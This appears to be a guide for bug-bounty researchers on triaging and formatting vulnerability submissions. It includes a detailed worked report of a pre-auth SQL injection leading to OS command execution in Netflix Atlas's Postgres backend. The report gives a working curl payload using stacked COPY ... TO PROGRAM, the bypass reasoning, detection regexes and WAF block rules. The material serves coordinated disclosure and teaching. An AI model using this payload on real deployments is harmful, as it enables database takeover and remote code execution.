# Bug-Bounty Triage & Submission

> **Load when**: preparing a bug-bounty / coordinated-disclosure submission — deciding whether a *confirmed* finding will actually survive a program triager, and assembling it in the format that survives. Researcher-facing, **pre-submission**. (The automated v2 Phase 5 REPORT critic is a separate, in-pipeline gate — see `report-phase.md`.)

A finding is *technically confirmed* the moment it clears the Exploitability Gate. Whether it is *submittable* is a second, triager-facing question: programs close a large share of valid-looking reports as duplicate, out-of-scope, or "informative." Run the funnel below **before you write a line of the report** — then assemble it with the canonical template, modeled on the worked example at the bottom.

---

## Pre-Submission Triage Funnel

Walk the gates top-to-bottom. **All must pass**, or the finding goes to Observations / you fix the gap first. Never submit a finding that fails a gate hoping the triager won't notice — that is how a researcher's signal score craters.

| # | Gate | Pass condition | If it fails | Detail |
|---|------|----------------|-------------|--------|
| 1 | **Real?** | Exploitability Gate Q1–Q3 close as a DAG: control the input → reaches the sink through every transform → proven impact. | → Observations | `exploitability-gate.md`, `../methodology/dag-reasoning.md` |
| 2 | **Proven unmodified?** | Both PoC forms exist; nothing mocked/patched/flag-toggled in the request path; `config_state = vanilla` (or the non-vanilla prerequisite is disclosed up front). | Build the missing form / re-run on a clean deploy | `poc-constraints.md`, `audit-poc-report.md` § PoC |
| 3 | **In scope?** | Asset + vuln class are in the program's published scope; the `config_state` is reachable in real deployments, not a self-inflicted misconfiguration. | Out of scope — don't submit | program policy + *Reading the program's scope* below |
| 4 | **Not auto-rejected?** | Not a Submission-N/A condition and not an Always-Rejected class — unless chained to proven impact. | → Observations, or build the chain that makes it valid | `audit-poc-report.md` § Submission N/A + § Always-Rejected |
| 5 | **Not a duplicate?** | Not already reported / patched / publicly known for this asset **at this version**. | De-prioritize; submit only with a novel variant or higher proven impact | *Duplicate & Known-Issue Check* below |
| 6 | **Severity honest?** | Tiered CVSS, each tier's assumption explicit; the score downgrades cleanly under the program's real environment. | Re-tier honestly — an inflated score gets closed, not negotiated | *Severity* below + `audit-poc-report.md` § CVSS |
| 7 | **Availability / DoS realism bar met?** | DoS / availability is a **first-class, severity-rated impact, not an auto-reject** — see `scope-policy.md` (single source of truth). A purely availability finding is rankable when it clears the realism bar: a reproducible, **sustained** outage (crash / hang / process-death, not a slowdown) proven on the real deployed surface from minimal attacker effort. Then apply any **program-specific** availability exclusion read from the engagement's published scope — never a hard-coded default. | Realism bar unmet (mere slowdown / flood-only / client-side-only crash) → Observations. Otherwise rank it; only an explicit **per-engagement** scope exclusion moves it out. | `scope-policy.md`; severity via `exploitability-gate.md` |

> **The discipline in one line:** *an honest report that downgrades cleanly survives triage; an inflated one gets closed N/A.* Your job is to make the triager's four-question decision — **real / in scope / reproducible / what severity** — fast and obvious.

---

## Triager-Empathy Rules

A triager reads top-to-bottom and stops the moment they are convinced — or the moment they catch you inflating. The MANDATORY report-writing rules (full text: `audit-poc-report.md` § Report Writing Rules), in one breath:

1. **Lead with bug → vector → impact** in line one. The title alone says what, where, and how bad.
2. **Short. No filler.** Every sentence carries a fact the triager needs; prefer tables/code over prose.
3. **Answer the four questions explicitly** — real, in scope, reproducible, severity — with `file:line` of the sink, auth status, affected releases, and a one-command repro.
4. **Honest scope = eligibility.** Surface prerequisites, role assumptions, and environment caveats up front; never bury a `SUPERUSER` requirement or an internal-only-ingress caveat.
5. **PoC the triager can run in one command,** expected output shown inline; explain *why* it works in plain words.
6. **Prove it ran unmodified** — exact container setup, no debug flags / mocks / source patches in the request path.

---

## Canonical Submission Template

The section **order is load-bearing** — it front-loads the triager's decision so they can stop early. Drop sections that don't apply; never reorder the ones that do. A complete filled-in instance is the *Gold-Standard Worked Example* below.

1. **Title (one line)** — `<auth status> <vuln class> → <ultimate impact> via <specific vector> (<product>, <affected deployment/config>)`.
2. **Triager Quickstart** — ≤ 3 copy-pasteable commands (spin up / attack / teardown) + one line of what `attack` prints on success. Note how minimal the attack is.
3. **Quick Triage (table)** — Endpoints · Auth (+ how you verified it) · Sink introduced (commit SHA) · Reachable releases · Patch status · CVE/CWE · Vulnerable `file:line` · Severity (realistic baseline + live-confirmed ceiling).
4. **Single-Command PoC** — the one reproduction, copy-pasteable, with **expected output inline as comments**. Number any setup steps.
5. **Why It Works** — payload (URL-decoded) → the exact sink line it lands in → the handful of facts that make it fire → the constraints you worked around.
6. **Reachable Endpoints (table)** — `Endpoint | Status | Notes`, each marked **PROVEN / TestKit-only / Blocked**. Be honest; list the blocked ones and why.
7. **Sinks / Variants (table)** — `Line | Function | Reachable pre-auth via | Notes`; include sinks that exist but are not network-reachable, labeled as such (fix anyway = defense-in-depth).
8. **CVSS — tiered with explicit assumptions** — 2–3 tiers, each with assumption + vector string + score; mark the realistic baseline and **why**; list caveats that move the score. See *Severity* below.
9. **Prerequisite / Scope** — what is affected and, explicitly, what is **NOT**; note any operator-supplied glue and confirm it does not participate in the bug.
10. **Infra Integrity (nothing mocked)** — prove the exploit hit vanilla code; list any convenience knobs that only speed iteration and do not affect reachability.
11. **Vulnerable Code** — minimal excerpt with the sink line marked; name the escaping/validation function and state exactly what it fails to do.
12. **Request → Sink Call Chain** — verified path from entry to sink, one arrow per hop, annotated with the decode/encode step that matters.
13. **Verification Status** — separate what is confirmed by (a) file read, (b) grammar/semantics, (c) live on-the-wire; give the date and the proof artifact.
14. **Detection** — log signatures and query-string regexes a defender can deploy now.
15. **Interim Mitigations (no patch required)** — WAF/ingress rules, privilege drops, audit logging — ordered by effectiveness.
16. **Recommended Fix** — the code change, every line that needs it, and confirmation the fix was verified against the test/E2E suite without breaking legitimate input.
17. **Reporter** — name, contact, disclosure stance (coordinated / embargo / immediate).
18. **Acknowledgments** — credit line(s); some programs want a separate acknowledgments entry distinct from the reporter contact.
19. **Impact** — the confirmed primitives (live) first, then conditional escalations with their conditions stated. Lead with what works unconditionally.

---

## Reading the Program's Scope

A finding is only submittable if the program *wants* it. Before investing in the write-up:

- **In-scope assets** — confirm the exact domain / repo / binary is on the in-scope list, not merely adjacent to it. Wildcards (`*.example.com`) usually exclude third-party-hosted subdomains.
- **In-scope vulnerability classes** — many programs exclude whole classes (self-XSS, missing headers, rate-limiting, best-practice findings, raw scanner output). These overlap the Always-Rejected list but are *program-specific* — read the policy, don't assume.
- **Out-of-scope / known-issues lists** — a finding the program has already published as known or out-of-scope is closed Informative regardless of impact.
- **Testing rules** — respect rate limits, no-automated-scanning clauses, the accounts you may use, and the data you may access. A valid bug found via out-of-bounds testing can still be rejected.
- **`config_state` reachability** — the bug must be reachable in a deployment the program actually runs; one that needs a non-default, self-inflicted misconfiguration is out of scope unless the program ships that config. (Same notion as the Phase 5 critic's `config_state` eligibility check — `report-phase.md`.)

---

## Duplicate & Known-Issue Check

Programs close duplicates with no bounty, and an avoidable duplicate costs signal score. Before submitting, rule out that the bug is already known **for this asset at this version**:

- **Program disclosure feed** — read the program's disclosed reports (HackerOne hacktivity, Bugcrowd disclosures) for the same asset + sink class.
- **Upstream trackers + advisories** — GitHub Security Advisories, the project's issues/PRs, and NVD/CVE for the affected component and version range. A fix merged on `main` but unreleased is still likely a duplicate.
- **Patch state** — if the sink is already fixed in a later tag, scope your *Reachable releases* to the still-vulnerable range and **say so**. Submitting against a patched HEAD is an instant close.
- **Within the DB (v2)** — `finding_hash` UNIQUE over `(target_id, finding_kind, sink_id, source_id)` dedupes within a run; cross-audit, query prior `gr_findings WHERE target_id = ? AND confirmation_status = 'confirmed'` before re-reporting (SKILL.md § Phase L8).
- **When a near-duplicate exists**, submit only with: a *novel variant* (a new vector/endpoint reaching the same sink), a *higher proven impact* (the known report stopped at blind SQLi; you prove RCE), or evidence the prior report was closed without a fix. State the relationship to the prior art explicitly — triagers reward honesty about it.

---

## Severity — tier it honestly

Injection and auth severity swing on privilege and network reach, so give **2–3 CVSS tiers, each with its assumption stated** (vector string + score), and mark which tier is the realistic baseline and **why**. List the caveats that move the score (mTLS or internal-only ingress → `AV:A`; managed Postgres blocks `COPY TO PROGRAM`; single-node deploy → `S:C` drops to `S:U`). Map the finding to the skill's P0–P3 priority tiers (SKILL.md § Phase L5) for internal ranking. The worked example below tiers a single SQLi from 8.1 to 10.0 with each assumption explicit — copy that structure.

---

## Gold-Standard Worked Example

> A real accepted submission. Study the density: every line earns its place, severity is tiered honestly, the PoC is one curl, and scope explicitly excludes the default config. Imitate this.

### Title

**Pre-auth SQL injection → DB-host RCE via `:by` tag-key alias on `/api/v1/graph`** (Netflix Atlas, atlas-postgres deployments)

### Triager Quickstart

```bash
bash scripts/atlas-postgres-spinup.sh up      # term 1: postgres + atlas on :7101
bash scripts/atlas-postgres-spinup.sh attack  # term 2: prints "RCE CONFIRMED ... uid=999"
bash scripts/atlas-postgres-spinup.sh down    # cleanup
```

`attack` is a single curl + `docker exec cat`. No sbt, no Java, no TestKit.

### Quick Triage

| Field | Value |
|-------|-------|
| Endpoints | `GET /api/v1/graph?q=…:by` (primary on-the-wire vector), `GET /api/v2/fetch?q=…:by`, `GET /api/v1/tags/{key}` (TestKit-only) |
| Auth | Pre-auth — zero auth filters in `atlas-webapi/src/main` |
| Sink introduced | `ca54a604` — *postgres: db implementation (#1603)* |
| Reachable releases | v1.8.0, v1.8.1, v1.8.2, v1.9.0-rc.1–rc.5 (HEAD `7a94a9ec`) |
| Patch status | None upstream. Fix proposed below; validated against in-tree E2E suite. |
| CVE | Requesting assignment via Netflix or MITRE |
| CWE | CWE-89, CWE-94, CWE-20 |
| Vulnerable file / line | `atlas-postgres/src/main/scala/com/netflix/atlas/postgres/SqlUtils.scala:189` (alias position in `dataQueries`); also `:155` for `valueQueries` |
| Severity | Realistic baseline **9.8 Critical**; live-confirmed ceiling **10.0 Critical** (RCE on DB host as `postgres` OS user) |

### Single-Curl PoC

```bash
TBL=$(docker exec vhigh4-pathA-pg psql -U atlas -d atlas -tAc \
  "select tablename from pg_tables where schemaname='atlas' and tablename like 'requests_%' order by tablename desc limit 1")
PROOF=/tmp/pwned-atlas-bb-poc

curl -sS "http://localhost:7101/api/v1/graph?q=name,requests,:eq,(,x%22%0Afrom%20atlas.${TBL}%0A)%20%3B%20COPY%20%28SELECT%20%24%24pwn%24%24%29%20TO%20PROGRAM%20%24%24id%20%3E%20${PROOF}%24%24%20%3B%20%28SELECT%201%20--,),:by&format=json"
#   → HTTP 500 — pgjdbc "Multiple ResultSets" raised AFTER COPY ran. Expected.

docker exec vhigh4-pathA-pg cat "${PROOF}"
#   → uid=999(postgres) gid=999(postgres) groups=999(postgres),101(ssl-cert)
```

`COPY ... TO PROGRAM` runs as the `postgres` OS user inside the container. RCE on the DB host.

### Why It Works

Injection key (URL-decoded), dropped into `SqlUtils.scala:189` (`s"$column as \"${escapeLiteral(label)}\""`):

```
x"
from atlas.requests_<yyyyMMddHHmm>
) ; COPY (SELECT $$pwn$$) TO PROGRAM $$id > /tmp/pwned-atlas-bb-poc$$ ; (SELECT 1 --
```

Four facts:

1. `escapeLiteral` doubles `'` and `\` only. `"` passes through and closes the alias.
2. Pekko `Uri.query()` decodes `%22` → `"` and `%0A` → `\n` in the query component. (`path(Remaining)` re-encodes them in path segments — that blocks the TagsApi curl path, not this one.)
3. pgjdbc `executeQuery` uses the simple-query protocol. Postgres runs every `;`-separated statement before the driver raises *Multiple ResultSets*.
4. `(SELECT 1 --` rebalances the `union()` wrapper's trailing `)`. `--` kills the wrapper's trailing `"` on line 1; from/where/group by/`)` continue the dummy `SELECT 1` on the following lines.

Constraints (handled above):

- **No `,` in the key** — ASL splits `(,a,b,c,)` on top-level commas. Use `%0A` newlines for statement separation.
- **No `'` or `\`** — `escapeLiteral` doubles both. Use `$$…$$` dollar-quoting.
- **`%0A` for newlines** — a real `\n` after the `"` breakout becomes a SQL line separator.

### Reachable Endpoints (3 on-the-wire vectors confirmed live 2026-05-10)

All three hit `SqlUtils.dataQueries → SqlUtils.scala:189` via the `:by` group-key path.

| Endpoint | Status | Notes |
|----------|--------|-------|
| `GET /api/v1/graph?q=…:by&format=json` | **PROVEN** | Primary PoC |
| `GET /api/v1/graph?q=…:by&format=csv` | **PROVEN** | Sink runs before format renderer |
| `GET /api/v2/fetch?q=…:by` | **PROVEN** | Same payload, different route |
| `GET /api/v1/tags/{key}` | TestKit-only | Pekko `path(Remaining)` re-encodes `%22`→`"%22`. Sink at `:155` reachable only via TestKit |
| `GET /api/v1/expr/{debug,normalize,queries}`, `POST /graph` | Blocked | Don't reach `SqlUtils.dataQueries`, or wrong method |

### Sinks (variants)

| Line | Function | Reachable pre-auth via | Notes |
|------|----------|------------------------|-------|
| `:189` | `dataQueries` SELECT-alias | `GET /api/v1/graph?q=…:by`, `GET /api/v2/fetch?q=…:by` | Primary; live curl-confirmed RCE |
| `:155` | `valueQueries` SELECT-alias | `GET /api/v1/tags/{key}` | Same primitive; TestKit-only on the wire (Pekko path note) |
| `:82` | `createTable` column DDL | bootstrap-only — same DB role at deploy time | Not network-reachable; inherits role privs |
| `:263` | `formatColumn` gated branch | gated by `columns.contains(k)` | Fix anyway as defense-in-depth |

### CVSS 3.1 — three tiers

CVSS for SQLi is sensitive to DB-role privilege; three vectors with the assumption made explicit. **Tier 2 is the baseline** for any running atlas-postgres deployment because bootstrap (`CREATE EXTENSION hstore`, `CREATE OR REPLACE AGGREGATE`, `COPY ... FROM STDIN`) cannot complete without DDL + write privileges on schema `atlas`.

| Tier | Assumption | Vector | Score |
|------|-----------|--------|-------|
| **1 — floor** | Hypothetical read-only role with SELECT on the Atlas schema only. Cannot actually start atlas-postgres (bootstrap needs DDL), so this is a lower bound, not a real deployment. Reads any table the role can SELECT plus non-restricted catalogs. A:L from `pg_sleep` blind and pool exhaustion. | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:L` | **8.1 High** |
| **2 — realistic** | Role has what atlas-postgres actually requires to start: CREATE on schema `atlas`, ownership of Atlas tables, and `pg_write_server_files` (or equivalent). Adds INSERT/UPDATE/DELETE on telemetry tables, DROP, long-held locks, stacked `pg_sleep` pool exhaustion. | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` | **9.8 Critical** |
| **3 — maximum (live-confirmed)** | Role is SUPERUSER (operator path of least resistance — see below). Stacked `COPY (...) TO PROGRAM '<cmd>'` executes OS commands as the `postgres` OS user. S:C because the OS shell on the DB host is a different security authority from the webapp. | `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` | **10.0 Critical** |

CVSS 4.0 (Tier 2 baseline): `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H` → **9.3 Critical**.

Caveats:

- All tiers assume network reach. If behind mTLS or internal-only ingress, downgrade `AV:N` → `AV:A`; Tier 2 → 8.7 High, Tier 3 → 9.6 Critical.
- `S:C` at Tier 3 reflects the webapp → DB-host trust-boundary crossing. Single-node dev/test (webapp + Postgres on one host) drops to `S:U` → 9.8 Critical.
- Not tested on managed PG (RDS, Cloud SQL), where `COPY TO PROGRAM` is blocked even for superusers; Tier 3 collapses to Tier 2 there.

### Why SUPERUSER is the realistic case

atlas-postgres bootstrap pushes operators toward broad privileges:

- `PostgresService.startImpl` runs `CREATE EXTENSION IF NOT EXISTS hstore` (requires SUPERUSER on PG ≤ 12; `pg_database_owner` or trusted on later versions).
- `SqlUtils.customFunctions` issues `CREATE OR REPLACE AGGREGATE atlas_aggr_*` (requires SUPERUSER or explicit aggregate ownership).
- `PostgresTagIndex` / `BinaryCopyBuffer` use `COPY ... FROM STDIN` (needs `pg_write_server_files` or SUPERUSER).
- OSS docs and `reference.conf` give no guidance to drop privileges post-bootstrap; iep operator templates run one connection user end-to-end.

SUPERUSER is the path of least resistance for startup to succeed — making `COPY TO PROGRAM` the realistic ceiling, not an edge case.

### Prerequisite / Scope

Affects deployments using the atlas-postgres backend (`com.netflix.atlas.postgres.PostgresDatabase`). OSS does not ship Spring/Guice glue that wires this backend into atlas-standalone — `DatabaseSupplier` (`atlas-webapi/.../DatabaseSupplier.scala:32`) reflectively constructs `Database` via a `(Config)` ctor; `PostgresDatabase(svc: PostgresService)` exposes only a `(PostgresService)` ctor. Any deployment running atlas-postgres has supplied its own wrapper. The bundle ships a 7-line operator-typical adapter (`PostgresDatabaseFromConfig.scala`) so the setup runs locally; it is the minimum glue an operator must provide and does not participate in the SQLi.

- Default atlas-standalone with `MemoryDatabase` is **NOT** affected.
- Any deployment that has wired atlas-postgres **IS** pre-auth exploitable.

Pre-auth verified: `grep -rE 'authenticate|requireAuth|Authorization|BasicHttpCredentials' atlas-webapi/src/main/scala/` returns zero hits.

### Infra Integrity (nothing mocked to enable the exploit)

- No source patches to atlas-postgres or atlas-webapi. The exploit triggers vanilla code at `SqlUtils.scala:189`.
- No mock objects, fakes, stubs, or test doubles in the request path. `attack` exercises the real pekko-http server, real `LocalDatabaseActor`, real `PostgresDatabase`, real pgjdbc, real `postgres:16`.
- The atlas Postgres role is SUPERUSER — that is the operator default, not an uplift (see *Why SUPERUSER* above). Tier-3 RCE needs SUPERUSER; Tier-1/2 SQLi (read, blind, error-leak) does not.
- Triage convenience knobs in `conf/postgres.conf` (`rebuild-frequency = 8s`, `block-size = 1`, `num-blocks = 1`, pre-seeded row) speed up iteration. None affect SQLi reachability or the RCE primitive.
- Full line-by-line audit: `INFRA-AUDIT.md` in the bundle.

### Vulnerable Code

`atlas-postgres/src/main/scala/com/netflix/atlas/postgres/SqlUtils.scala` (sink at `:189`):

```scala
def dataQueries(time: Instant, tables: List[TableDefinition], expr: DataExpr): List[String] = {
  ...
  val groupBys = expr.finalGrouping.map { label =>          // ← label from ASL :by clause
    val column = formatColumn(table.columns, label)
    s"$column as \"${escapeLiteral(label)}\""               // ← :189  UNGATED, escapeLiteral does NOT escape "
  }
  ...
}
```

`escapeLiteral` (`SqlUtils.scala:268`) delegates to `org.postgresql.core.Utils.escapeLiteral(buf, str, false)`, which doubles `'` and `\` only. The same bug shape exists at `:155` for `valueQueries` (alias label from `tq.key`).

### Request → SQL Call Chain (verified by file read)

```
GET /api/v1/graph?q=...,(,key,),:by
  → atlas-webapi   GraphApi          (?q= parsed via Uri.query() — DECODES %22 and %0A)
  → atlas-webapi   GraphRequestActor → LocalDatabaseActor.scala:41
  → atlas-postgres PostgresDatabase  → SqlUtils.dataQueries
  → atlas-postgres SqlUtils.scala:189 (alias interpolation — INJECTION)
  → pgjdbc Statement.executeQuery   (simple-query protocol — `;`-stacking executes)
  → postgres backend                 (COPY ... TO PROGRAM fires, then driver raises Multiple ResultSets)
```

### Verification Status

- **Source path**: confirmed by file read.
- **Payload semantics**: confirmed against PostgreSQL grammar.
- **Full on-the-wire chain** (curl → GraphApi → LocalDatabaseActor → real PostgresDatabase → postgres:16): confirmed live 2026-05-10 via `attack`. Proof file owned by `uid=999(postgres) gid=999(postgres)`.
- **Three on-the-wire endpoints proven**: `/api/v1/graph?format=json`, `/api/v1/graph?format=csv`, `/api/v2/fetch`.
- **TestKit reproduction** (`VHigh4PathAHttpRCESuite`, run via `attack-test`) covers the `/api/v1/tags/{key}` sink at `:155` — same primitive, only the on-the-wire delivery is blocked by Pekko path re-encoding.

### Detection

PostgreSQL log (`log_statement = 'mod'` or `'all'`):

```
LOG: statement: select distinct ".+?" as ".+?[";].+
LOG: statement: COPY .* TO PROGRAM
LOG: statement: COPY .* FROM PROGRAM
```

Pekko / atlas-webapi access log — query-string regex:

```
/api/v1/(tags|graph)|/api/v2/fetch.*([%]22|[%]3B|[%]2D[%]2D|--|"|;).*:by
```

Postmortem (any role with read on `pg_stat_statements`):

```sql
select query, calls from pg_stat_statements
 where query ~ '" as "[^"]*[";]' or query ~ 'COPY .* TO PROGRAM';
```

### Interim Mitigations (no source patch yet)

1. **Ingress / WAF.** Reject requests to `/api/v1/graph`, `/api/v2/fetch`, `/api/v1/tags/*` whose query string or path contains any of `"`, `%22`, `;`, `%3B`, `--`, `%2D%2D`, `\`, `%5C`.
2. **Drop SUPERUSER post-bootstrap.** Run `CREATE EXTENSION hstore`, aggregates, and `COPY FROM` under SUPERUSER once, then `ALTER ROLE atlas NOSUPERUSER` and revoke `pg_write_server_files`. Tier 3 collapses to Tier 2.
3. **Audit.** `ALTER SYSTEM SET log_statement = 'mod'; SELECT pg_reload_conf();` for forensic visibility on any future trigger.

### Recommended Fix

`SqlUtils.scala` — replace `escapeLiteral` with PostgreSQL's identifier escape in every alias and identifier-quoted position:

```scala
private def escapeIdentifier(str: String): String = {
  val buf = new java.lang.StringBuilder(str.length + 2)
  org.postgresql.core.Utils.escapeIdentifier(buf, str)  // doubles " and wraps in "..."
  buf.toString
}
```

Then change:

- `:155` → `select distinct $column as ${escapeIdentifier(key)}`
- `:189` → `s"$column as ${escapeIdentifier(label)}"`
- `:82` → `s"${escapeIdentifier(c)} ${config.columnType}"` (`createTable`)
- `:263` → the gated branch in `formatColumn` (defense-in-depth — also use `escapeIdentifier`)

Defense-in-depth at the webapi boundary: validate `tq.key` and ASL `:by` keys against `^[A-Za-z_][A-Za-z0-9_.\-]*$` before they reach the SQL layer. Reject anything containing `"`, `;`, `--`, `/*`, `\` or `'`.

**Fix verified.** With `escapeIdentifier` swapped in at `:82/:155/:189/:263`, the in-tree E2E suite no longer reaches `COPY TO PROGRAM` — the doubled `""` lands inside the alias and the SELECT parses cleanly. Legitimate alphanumeric keys are byte-identical to the unpatched output.

### Reporter

- **Reporter:** Luis Di Vittorio
- **Contact:** divittorioluis@gmail.com
- **Disclosure:** coordinated; ready for embargoed advisory or immediate publication at Netflix's discretion.

### Acknowledgments

Luis Di Vittorio

### Impact

- Pre-auth, GET-only SQL injection. No session, no admin role, no config control.
- Confirmed primitives (live):
  - Stacked statements through pgjdbc simple-query protocol — every `;`-separated statement runs before the driver raises *Multiple ResultSets*.
  - OS command execution via `COPY (SELECT $$$$) TO PROGRAM '<cmd>'` (requires SUPERUSER).
  - Time-based blind (`pg_sleep`) and error-based exfil (`cast(... as int)`) — work for any role.
  - Dollar-quoted (`$$…$$`) smuggling defeats the existing `escapeLiteral` (no `'` or `\` to mangle).
- Conditional escalation: UNION read of any table the role can SELECT. With SUPERUSER on PG ≤ 14 that includes `pg_authid` (password hashes); otherwise `pg_user`/`pg_roles` and Atlas tables.

---

## Phase-numbering crosswalk

| This doc / audit-poc-report.md label | SKILL.md L-lane |
|---|---|
| Phase 7 Q1–Q4 (exploitability gate) | Phase L7 (Exploitability Gate) |
| Phase 5 REPORT critic | Phase L7 (Confirm → critic sub-step) |
| Phase 4 (re-prove) | Phase L7 |
| Phase 8 (report finalize) | Phase L8 (Confirm / Report) |

## Cross-References

| Need to | Read |
|---|---|
| Gate "is it real" (Q1–Q4 + the mechanical DAG) | `references/phases/exploitability-gate.md`, `references/methodology/dag-reasoning.md` |
| Check the Submission-N/A + Always-Rejected classes | `references/phases/audit-poc-report.md` § Submission N/A, § Always-Rejected |
| Build both PoC forms / the realism (no-mocking) rules | `references/phases/poc-constraints.md`, `references/phases/audit-poc-report.md` § PoC |
| Wrap several findings in an audit/pentest deliverable | `references/phases/audit-poc-report.md` § Multi-Finding Report Wrapper |
| Understand the in-pipeline automated triage (Phase L7 critic) | `references/phases/report-phase.md`, `references/v2/critic-rubric.md` |
| Re-score severity in exploit-chain context | `references/phases/chaining-advanced-techniques.md` |
